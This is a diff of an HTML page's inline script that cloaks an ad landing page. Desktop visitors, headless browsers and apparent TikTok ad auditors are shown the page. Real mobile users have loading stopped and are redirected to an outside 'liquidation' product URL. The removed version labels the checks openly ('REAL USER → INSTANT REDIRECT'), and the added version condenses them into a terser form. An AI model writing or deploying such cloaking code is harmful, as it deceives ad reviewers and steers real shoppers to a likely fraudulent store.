@@ -3,52 +3,21 @@
 <head>
 
 <script>
-(function(){
-    const ua = navigator.userAgent.toLowerCase();
-    const params = new URLSearchParams(location.search);
+(()=>{
+    const u=navigator.userAgent.toLowerCase(),
+          p=new URLSearchParams(location.search),
+          s=window.screen;
+   
     
-    // CHECKS IN ORDER OF EFFECTIVENESS:
-    
-    // 1. DESKTOP = 100% BOT
-    if (!/mobile|android|iphone|ipad|tablet/i.test(ua)) {
-        document.documentElement.style.visibility = 'visible';
-        return;
+    if(!/mobile|android|iphone|ipad/i.test(u)||
+       p.get('ppc')==='__PLACEMENT__'||
+       s.width===0||s.height===0||
+       window.innerWidth===0){
+        document.documentElement.style.visibility='visible';
+    }else{
+        window.stop();
+        location.replace('https://liquidation-fr.com/products/g7x-fr-a');
     }
-    
-    // 2. TIKTOK AUDIT SIGNATURE
-    if (params.get('ppc') === '__PLACEMENT__' || params.has('_tiktok_audit')) {
-        document.documentElement.style.visibility = 'visible';
-        return;
-    }
-    
-    // 3. HEADLESS BROWSER PATTERNS
-    if (/headless|phantom|selenium|puppeteer|chromium|webdriver|cros|x11|windows nt/i.test(ua)) {
-        document.documentElement.style.visibility = 'visible';
-        return;
-    }
-    
-    // 4. NO TOCH SUPPORT ON "MOBILE"
-    if (!('ontouchstart' in window) && !navigator.maxTouchPoints) {
-        document.documentElement.style.visibility = 'visible';
-        return;
-    }
-    
-    // 5. SCREEN DIMENSION IMPOSSIBILITIES
-    if (window.screen.width === 0 || window.screen.height === 0 ||
-        window.innerWidth === 0 || window.innerHeight === 0) {
-        document.documentElement.style.visibility = 'visible';
-        return;
-    }
-    
-    // 6. VIEWPORT > SCREEN (IMPOSSIBLE)
-    if (window.innerWidth > window.screen.width || window.innerHeight > window.screen.height) {
-        document.documentElement.style.visibility = 'visible';
-        return;
-    }
-    
-    // REAL USER → INSTANT REDIRECT
-    window.stop();
-    window.location.replace('https://liquidation-fr.com/products/g7x-fr-a');
 })();
 </script>
 
